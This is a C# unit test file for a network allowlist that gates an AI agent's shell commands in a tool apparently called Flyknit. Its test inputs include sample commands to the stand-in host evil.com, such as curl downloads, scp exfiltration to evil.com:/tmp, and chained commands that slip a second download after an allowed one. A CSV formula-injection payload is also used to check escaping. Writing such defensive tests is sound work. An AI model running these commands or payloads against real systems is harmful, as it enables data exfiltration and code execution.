using System.Text.Json;
using Flyknit.Core.Security;
using Flyknit.Core.Storage;
using Flyknit.Core.Tools;
using Xunit;

namespace Flyknit.Core.Tests;

public class NetworkPolicyTests
{
    private static readonly NetworkPolicy Network = new(new[] { "shenzhougroup.com", "*.github.com", "localhost" }, allowPrivateNetwork: true);

    [Theory]
    [InlineData("shenzhougroup.com")]
    [InlineData("mail.shenzhougroup.com")]
    [InlineData("api.github.com")]
    [InlineData("github.com")]
    [InlineData("localhost")]
    [InlineData("10.0.0.10")]
    [InlineData("172.20.1.5")]
    [InlineData("192.168.1.1")]
    [InlineData("127.0.0.1")]
    [InlineData("erp")]
    public void AllowedHosts(string host)
    {
        Assert.True(Network.IsAllowed(host));
    }

    [Theory]
    [InlineData("evil.com")]
    [InlineData("shenzhougroup.com.evil.com")]
    [InlineData("notshenzhougroup.com")]
    [InlineData("8.8.8.8")]
    [InlineData("172.32.0.1")]
    public void BlockedHosts(string host)
    {
        Assert.False(Network.IsAllowed(host));
    }

    [Fact]
    public void PrivateNetworkCanBeTurnedOff()
    {
        var strict = new NetworkPolicy(new[] { "shenzhougroup.com" }, allowPrivateNetwork: false);
        Assert.False(strict.IsAllowed("10.0.0.10"));
        Assert.False(strict.IsAllowed("erp"));
        Assert.True(strict.IsAllowed("shenzhougroup.com"));
    }

    [Fact]
    public void StarAllowsEverything()
    {
        Assert.True(new NetworkPolicy(new[] { "*" }, false).IsAllowed("anything.example"));
    }

    [Fact]
    public void EmptyListBlocksPublicSites()
    {
        Assert.False(new NetworkPolicy(null, true).IsAllowed("example.com"));
    }

    [Theory]
    [InlineData("curl https://evil.com/x -o a.zip")]
    [InlineData("Invoke-WebRequest -Uri 'https://evil.com/a' -OutFile a")]
    [InlineData("start https://evil.com")]
    [InlineData("curl https://shenzhougroup.com/a; curl http://evil.com/b")]
    public void CommandsToSitesOutsideTheListAreBlocked(string command)
    {
        var d = Network.EvaluateCommand(command);
        Assert.NotNull(d);
        Assert.Equal(RiskLevel.Blocked, d!.Level);
        Assert.Contains("evil.com", d.Reason);
    }

    [Theory]
    [InlineData("curl https://api.github.com/repos -o r.json")]
    [InlineData("Invoke-RestMethod http://10.0.0.5:8080/api/report")]
    [InlineData("dir D:\\reports")]
    [InlineData("copy ftp.txt backup\\ftp.txt")]
    public void AllowedOrOfflineCommandsHaveNoConcern(string command)
    {
        Assert.Null(Network.EvaluateCommand(command));
    }

    [Theory]
    [InlineData("curl $url -o a.zip")]
    [InlineData("iwr -Uri $env:TARGET")]
    [InlineData("(New-Object Net.WebClient).DownloadFile($u, 'a.zip')")]
    [InlineData("[Net.WebRequest]::Create($u)")]
    [InlineData("git clone git@$server:repo")]
    [InlineData("pip install requests")]
    [InlineData("npm install")]
    public void NetworkCommandsWithoutAVisibleUrlNeedConfirmation(string command)
    {
        var d = Network.EvaluateCommand(command);
        Assert.NotNull(d);
        Assert.Equal(RiskLevel.Confirm, d!.Level);
    }

    [Theory]
    [InlineData("curl example.com")]
    [InlineData("curl https://localhost evil.com")]
    [InlineData("curl https://shenzhougroup.com/a -o a; wget evil.com/b")]
    [InlineData("ssh admin@8.8.8.8")]
    [InlineData("scp a.txt user@evil.com:/tmp")]
    [InlineData("Start-Process msedge evil.com")]
    public void SchemelessHostsInNetworkCommandsAreChecked(string command)
    {
        var d = Network.EvaluateCommand(command);
        Assert.NotNull(d);
        Assert.Equal(RiskLevel.Blocked, d!.Level);
    }

    [Theory]
    [InlineData("curl api.github.com/repos -o r.json")]
    [InlineData("ssh admin@10.0.0.8")]
    [InlineData("scp report.xlsx admin@erp.shenzhougroup.com:/upload")]
    public void SchemelessHostsOnTheListAreFine(string command)
    {
        Assert.Null(Network.EvaluateCommand(command));
    }

    [Theory]
    [InlineData("copy report.xlsx D:\\backup\\report.xlsx")]
    [InlineData("python tool.py --out data.md")]
    [InlineData("pip install pandas==2.2.1")]
    public void FileNamesAreNotMistakenForHosts(string text)
    {
        Assert.Empty(NetworkPolicy.BareHostsIn(text));
    }

    [Theory]
    [InlineData("msedge evil.com")]
    [InlineData("chrome --app=https://evil.com")]
    [InlineData("evil.com")]
    public void LaunchArgumentsAreChecked(string text)
    {
        Assert.Equal(RiskLevel.Blocked, Network.EvaluateTargetsIn(text)!.Level);
    }

    [Fact]
    public void LaunchArgumentsOnTheListPass()
    {
        Assert.Null(Network.EvaluateTargetsIn("msedge mail.shenzhougroup.com"));
        Assert.Null(Network.EvaluateTargetsIn("excel D:\\报表\\周报.xlsx"));
    }

    [Fact]
    public void UrlTrailingPunctuationIsTrimmed()
    {
        Assert.Equal(new[] { "https://github.com/a" }, NetworkPolicy.UrlsIn("see (https://github.com/a)."));
    }

    private static ToolContext Context(bool allowlistOn, PermissionMode mode = PermissionMode.Workspace)
    {
        var workspace = Directory.CreateTempSubdirectory("flyknit-net").FullName;
        var security = new SecuritySettings(new Dictionary<string, SecurityItem>
        {
            [SecuritySettings.NetworkAllowlist] = new() { Value = allowlistOn, Locked = true },
        });
        return new ToolContext
        {
            Policy = CommandPolicy.Default(),
            ConversationId = "c1",
            Workspace = workspace,
            Permission = mode,
            Security = security,
        };
    }

    private static JsonElement Args(string command) =>
        JsonDocument.Parse(JsonSerializer.Serialize(new { command })).RootElement.Clone();

    [Fact]
    public void RunShellBlocksSitesOutsideTheListEvenWithFullPermission()
    {
        var d = new RunShellTool().Assess(Args("curl https://evil.com/a -o a.txt"), Context(true, PermissionMode.Full));
        Assert.Equal(RiskLevel.Blocked, d.Level);
    }

    [Fact]
    public void RunShellIgnoresTheListWhenTheSwitchIsOff()
    {
        var d = new RunShellTool().Assess(Args("curl https://evil.com/a -o a.txt"), Context(false, PermissionMode.Full));
        Assert.NotEqual(RiskLevel.Blocked, d.Level);
    }

    [Fact]
    public void UnknownNetworkTargetCannotBeRemembered()
    {
        var d = new RunShellTool().Assess(Args("curl $target -o a.txt"), Context(true));
        Assert.Equal(RiskLevel.Confirm, d.Level);
        Assert.False(d.Rememberable);
    }

    [Fact]
    public void SecurityEventsCsvIsExcelFriendly()
    {
        var events = new[]
        {
            new SecurityEvent
            {
                Decision = "blocked", Scene = "agent", Tool = "run_shell",
                Detail = "=cmd|' /C calc'!A0", Reason = "命中安全规则, 已阻止", ConversationTitle = "整理\"日报\"",
                CreatedAt = new DateTimeOffset(2026, 10, 6, 8, 0, 0, TimeSpan.Zero),
            },
        };
        using var writer = new StringWriter();
        ConversationStore.WriteSecurityEventsCsv(events, writer);
        var text = writer.ToString();

        Assert.StartsWith("\uFEFF时间,判定", text);
        Assert.Contains("'=cmd|' /C calc'!A0", text);       // 公式被转义
        Assert.Contains("\"命中安全规则, 已阻止\"", text);     // 含逗号加引号
        Assert.Contains("\"整理\"\"日报\"\"\"", text);        // 引号双写
    }
}
